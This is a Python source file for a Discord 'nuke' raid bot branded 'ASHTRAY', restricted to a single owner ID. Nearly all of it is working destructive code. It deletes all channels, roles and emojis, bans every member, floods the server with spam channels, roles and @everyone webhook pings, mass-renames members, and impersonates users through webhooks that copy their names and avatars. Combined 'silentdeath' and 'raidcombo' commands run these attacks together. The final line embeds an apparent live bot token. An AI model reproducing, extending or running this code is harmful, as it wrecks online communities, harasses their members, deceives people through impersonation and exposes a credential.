import discord
import asyncio
import random
from discord import app_commands
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.emojis_and_stickers = True

bot = commands.Bot(command_prefix='!', intents=intents)
tree = bot.tree

# === YOUR USER ID — ONLY YOU CAN USE ANY COMMAND ===
OWNER_ID = 1397622915746500701
def is_owner():
    async def predicate(interaction: discord.Interaction):
        if interaction.user.id != OWNER_ID:
            await interaction.response.send_message("❌ This bot is private — only the true owner can use commands.", ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)

@bot.event
async def on_ready():
    print(f'{bot.user} is online — SLASH COMMAND DESTRUCTION MODE ACTIVATED!')
    print(f'Bot ID: {bot.user.id}')
    try:
        synced = await tree.sync()
        print(f"Synced {len(synced)} slash commands!")
    except Exception as e:
        print(e)

# === ALL DESTRUCTIVE COMMANDS — ONLY YOU ===

@tree.command(name="fullnuke", description="Delete all channels, roles, and emojis")
@is_owner()
async def full_nuke(interaction: discord.Interaction):
    await interaction.response.send_message("💥 Starting full nuke...", ephemeral=True)
    tasks = []
    for channel in interaction.guild.channels:
        tasks.append(channel.delete())
    for role in interaction.guild.roles[1:]:
        tasks.append(role.delete())
    for emoji in interaction.guild.emojis:
        tasks.append(emoji.delete())
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send('💥 FULL NUKE COMPLETE: Server wiped clean!')

@tree.command(name="spamchannels", description="Spam create text channels")
@is_owner()
@app_commands.describe(amount="Number of channels", name="Channel name")
async def spam_channels(interaction: discord.Interaction, amount: int = 100, name: str = "nuked"):
    await interaction.response.defer(ephemeral=True)
    tasks = [interaction.guild.create_text_channel(name) for _ in range(amount)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'💣 Spam channels complete!')

@tree.command(name="spamroles", description="Spam create roles")
@is_owner()
@app_commands.describe(amount="Number of roles", name="Role name")
async def spam_roles(interaction: discord.Interaction, amount: int = 80, name: str = "NUKED"):
    await interaction.response.defer(ephemeral=True)
    tasks = [interaction.guild.create_role(name=name) for _ in range(amount)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'🎨 Spam roles complete!')

@tree.command(name="deleteroles", description="Delete all custom roles")
@is_owner()
async def delete_roles(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    tasks = [role.delete() for role in interaction.guild.roles[1:]]
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'🗑️ Deleted all custom roles!')

@tree.command(name="createrole", description="Create a single role")
@is_owner()
@app_commands.describe(name="Role name")
async def create_role(interaction: discord.Interaction, name: str = "NEW-ROLE"):
    try:
        role = await interaction.guild.create_role(name=name)
        await interaction.response.send_message(f'🎨 Created role: **{role.name}** (ID: {role.id})')
    except:
        await interaction.response.send_message("❌ Failed to create role.", ephemeral=True)

@tree.command(name="webhookspam", description="Spam a message via webhook in current channel")
@is_owner()
@app_commands.describe(message="Message to spam", amount="Number of messages")
async def webhook_spam(interaction: discord.Interaction, message: str = "@everyone YOUR SERVER HAS BEEN NUKED", amount: int = 50):
    await interaction.response.defer(ephemeral=True)
    channel = interaction.channel
    for webhook in await channel.webhooks():
        try:
            await webhook.delete()
        except:
            pass
    webhook = await channel.create_webhook(name="NukeHook")
    tasks = [webhook.send(message, username="Nuker") for _ in range(amount)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'📢 Webhook spam complete!')

@tree.command(name="slowmodeall", description="Apply slowmode to all text channels")
@is_owner()
@app_commands.describe(delay="Delay in seconds (max 21600)")
async def slowmode_all(interaction: discord.Interaction, delay: int = 21600):
    await interaction.response.defer(ephemeral=True)
    tasks = [channel.edit(slowmode_delay=delay) for channel in interaction.guild.text_channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'🐌 Slowmode applied!')

@tree.command(name="banall", description="Ban all members (except owner and bot)")
@is_owner()
async def ban_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    tasks = []
    for member in interaction.guild.members:
        if member != interaction.guild.owner and member != bot.user:
            tasks.append(member.ban(reason="Maximum destruction"))
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'🔨 Ban wave complete!')

@tree.command(name="ban", description="Ban a specific member")
@is_owner()
@app_commands.describe(member="Member to ban", reason="Ban reason")
async def ban_user(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    try:
        await member.ban(reason=reason)
        await interaction.response.send_message(f'🔨 Banned {member}! Reason: {reason}')
    except:
        await interaction.response.send_message("❌ Ban failed.", ephemeral=True)

@tree.command(name="pingflood", description="Create channels and spam pings in each")
@is_owner()
@app_commands.describe(channels="Number of channels", pings_per="Pings per channel", name="Channel name", message="Message to send")
async def ping_flood(interaction: discord.Interaction, channels: int = 40, pings_per: int = 70, name: str = "nuked", message: str = "@everyone RAIDED BY ASHTRAY"):
    await interaction.response.send_message("🚀 Starting ultra-fast ping flood...", ephemeral=True)
    create_tasks = [interaction.guild.create_text_channel(name) for _ in range(channels)]
    new_channels_raw = await asyncio.gather(*create_tasks, return_exceptions=True)
    successful_channels = [ch for ch in new_channels_raw if isinstance(ch, discord.TextChannel)]
    spam_tasks = []
    for channel in successful_channels:
        spam_tasks.extend([channel.send(message) for _ in range(pings_per)])
    await asyncio.gather(*spam_tasks, return_exceptions=True)
    await interaction.followup.send(f"💥 Ping flood complete!")

@tree.command(name="massnick", description="Change all member nicknames")
@is_owner()
@app_commands.describe(nickname="New nickname")
async def mass_nick(interaction: discord.Interaction, nickname: str = "NUKED BY ASHTRAY"):
    await interaction.response.defer(ephemeral=True)
    tasks = []
    for member in interaction.guild.members:
        if member != bot.user and member != interaction.guild.owner:
            tasks.append(member.edit(nick=nickname[:32]))
    await asyncio.gather(*tasks, return_exceptions=True)
    await interaction.followup.send(f'😈 Mass nickname complete!')

@tree.command(name="prune", description="Prune inactive members")
@is_owner()
@app_commands.describe(days="Inactive days")
async def prune_members(interaction: discord.Interaction, days: int = 7):
    await interaction.response.defer(ephemeral=True)
    await interaction.guild.prune_members(days=days, compute_prune_count=False, reason="Cleanup before destruction")
    await interaction.followup.send(f'🧹 Pruned inactive members!')

@tree.command(name="changeservername", description="Change server name (random or custom)")
@is_owner()
@app_commands.describe(new_name="Custom name (optional - random if blank)")
async def change_server_name(interaction: discord.Interaction, new_name: str = None):
    if new_name is None:
        random_names = ["RAIDED BY ASHTRAY", "NUKED BY ASHTRAY", "OWNED BY ASHTRAY", "ASHTRAY WAS HERE", "SERVER GONE", "DEAD SERVER", "CHAOS ZONE", "WASTELAND", "HACKED BY ASHTRAY"]
        new_name = random.choice(random_names)
    try:
        await interaction.guild.edit(name=new_name)
        await interaction.response.send_message(f'🏴‍☠️ Server name changed to: **{new_name}**')
    except:
        await interaction.response.send_message("❌ Failed to change name.", ephemeral=True)

# === CUSTOM PING COMMAND ===
@tree.command(name="ping", description="Check Ashtray's latency")
@is_owner()
async def ping(interaction: discord.Interaction):
    message_latency = max(0, round((discord.utils.utcnow() - interaction.created_at).total_seconds() * 1000))
    shard_latency = round(bot.latency * 1000) if bot.latency != float('inf') else "N/A"

    embed = discord.Embed(title="**Pong!**", color=0x9932cc)
    embed.add_field(name="⚡ Messages", value=f"**{message_latency}ms**", inline=True)
    embed.add_field(name="💓 Shard", value=f"**{shard_latency}ms**", inline=True)
    embed.set_footer(text="ASHTRAY BOT — ALWAYS READY")

    await interaction.response.send_message(embed=embed)

# === IMPERSONATE COMMAND ===
@tree.command(name="impersonate", description="Send a message as someone else")
@is_owner()
@app_commands.describe(member="The member to impersonate", message="The message to send")
async def impersonate(interaction: discord.Interaction, member: discord.Member, message: str):
    await interaction.response.defer(ephemeral=True)
    channel = interaction.channel
    for webhook in await channel.webhooks():
        try:
            await webhook.delete()
        except:
            pass
    try:
        avatar_bytes = await member.display_avatar.read()
    except:
        avatar_bytes = None
    webhook = await channel.create_webhook(name=member.display_name, avatar=avatar_bytes)
    try:
        await webhook.send(message, username=member.display_name)
        await interaction.followup.send(f"✅ Message sent as **{member.display_name}**.", ephemeral=True)
    except:
        await interaction.followup.send("❌ Failed to send impersonated message.", ephemeral=True)

# === PURGE COMMAND ===
@tree.command(name="purge", description="Delete a specific number of messages in this channel")
@is_owner()
@app_commands.describe(amount="Number of messages to delete (max 10000)")
async def purge(interaction: discord.Interaction, amount: int = 100):
    if amount < 1:
        await interaction.response.send_message("❌ Amount must be at least 1.", ephemeral=True)
        return
    if amount > 10000:
        amount = 10000
    await interaction.response.send_message(f"🧹 Deleting the last **{amount}** messages...", ephemeral=True)
    channel = interaction.channel
    deleted = 0
    while deleted < amount:
        to_delete = amount - deleted
        limit = min(to_delete, 100)
        messages = [msg async for msg in channel.history(limit=limit, oldest_first=False)]
        if not messages:
            break
        if len(messages) == 1:
            try:
                await messages[0].delete()
                deleted += 1
            except:
                pass
            break
        try:
            await channel.delete_messages(messages)
            deleted += len(messages)
        except:
            for msg in messages:
                try:
                    await msg.delete()
                    deleted += 1
                except:
                    pass
        if deleted < amount:
            await asyncio.sleep(1.1)
    await interaction.followup.send(f"🧹 Purge complete! Deleted **{deleted}** messages.", ephemeral=True)

# === ULTRA FAST SILENT DEATH ===
@tree.command(name="silentdeath", description="Ultra-fast silent total wipe")
@is_owner()
async def silent_death(interaction: discord.Interaction):
    await interaction.response.send_message("🖤 **ULTRA SILENT DEATH** — wiping instantly...", ephemeral=True)

    guild = interaction.guild

    # Group 1: Instant damage
    priority_tasks = []
    try:
        priority_tasks.append(guild.edit(name=random.choice(["GONE", "EMPTY", "VOID", "WASTELAND", "DEAD"])))
    except:
        pass
    for member in guild.members:
        if member != bot.user and member != guild.owner:
            priority_tasks.append(member.edit(nick="ghost"))

    # Group 2: Spam
    spam_tasks = []
    for _ in range(120):
        spam_tasks.append(guild.create_text_channel("empty"))
    for _ in range(100):
        spam_tasks.append(guild.create_role(name="gone"))

    # Group 3: Bans
    ban_tasks = []
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            ban_tasks.append(member.ban(reason="Silent removal"))

    # Group 4: Final wipe
    wipe_tasks = []
    for channel in guild.channels:
        wipe_tasks.append(channel.delete())
    for role in guild.roles[1:]:
        wipe_tasks.append(role.delete())
    for emoji in guild.emojis:
        wipe_tasks.append(emoji.delete())

    # Run all groups in parallel — maximum speed
    await asyncio.gather(
        asyncio.gather(*priority_tasks, return_exceptions=True),
        asyncio.gather(*spam_tasks, return_exceptions=True),
        asyncio.gather(*ban_tasks, return_exceptions=True),
        asyncio.gather(*wipe_tasks, return_exceptions=True),
        return_exceptions=True
    )

    await interaction.followup.send("🖤 **ULTRA SILENT DEATH COMPLETE** — Total silence.", ephemeral=True)

# === ULTRA FAST RAID COMBO ===
@tree.command(name="raidcombo", description="Ultra-fast loud instant chaos")
@is_owner()
async def raid_combo(interaction: discord.Interaction):
    await interaction.response.send_message("☢️ **ULTRA FAST RAID** — annihilating now!", ephemeral=True)

    guild = interaction.guild
    channel = interaction.channel

    # Group 1: Instant damage
    priority_tasks = []
    try:
        priority_tasks.append(guild.edit(name=random.choice(["ASHTRAY OWNED", "NUKED", "DEAD SERVER", "WASTELAND"])))
    except:
        pass
    for member in guild.members:
        if member != bot.user and member != guild.owner:
            priority_tasks.append(member.edit(nick="NUKED BY ASHTRAY"))
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            priority_tasks.append(member.ban(reason="ASHTRAY WAS HERE"))

    # Group 2: Webhook spam
    webhook_tasks = []
    try:
        for webhook in await channel.webhooks():
            webhook_tasks.append(webhook.delete())
        webhook = await channel.create_webhook(name="Ashtray")
        for _ in range(60):
            webhook_tasks.append(webhook.send("@everyone ASHTRAY RAID", username="ASHTRAY"))
    except:
        pass

    # Group 3: Spam
    spam_tasks = []
    for _ in range(120):
        spam_tasks.append(guild.create_text_channel("ashtray-nuked"))
    for _ in range(100):
        spam_tasks.append(guild.create_role(name="OWNED"))

    # Group 4: Misc
    misc_tasks = []
    for ch in guild.text_channels:
        misc_tasks.append(ch.edit(slowmode_delay=21600))
    misc_tasks.append(guild.prune_members(days=1, compute_prune_count=False))

    # Group 5: Final wipe
    wipe_tasks = []
    for ch in guild.channels:
        wipe_tasks.append(ch.delete())
    for role in guild.roles[1:]:
        wipe_tasks.append(role.delete())
    for emoji in guild.emojis:
        wipe_tasks.append(emoji.delete())

    # Run all groups in parallel — maximum speed
    await asyncio.gather(
        asyncio.gather(*priority_tasks, return_exceptions=True),
        asyncio.gather(*webhook_tasks, return_exceptions=True),
        asyncio.gather(*spam_tasks, return_exceptions=True),
        asyncio.gather(*misc_tasks, return_exceptions=True),
        asyncio.gather(*wipe_tasks, return_exceptions=True),
        return_exceptions=True
    )

    await interaction.followup.send("💀 **ULTRA FAST RAID COMPLETE** — Nothing left.", ephemeral=True)

# === STOP COMMAND ===
@tree.command(name="stop", description="Shut down the bot")
@is_owner()
async def stop_bot(interaction: discord.Interaction):
    await interaction.response.send_message("🛑 Shutting down...", ephemeral=True)
    await bot.close()

# === RUN BOT ===
bot.run('MTQ1NTYzMTAzOTE3ODIxMTQ2MQ.GkBybv.IyEfxom9Fx-6-tqeZYi8csHU7_sNG9dcj9CDvw')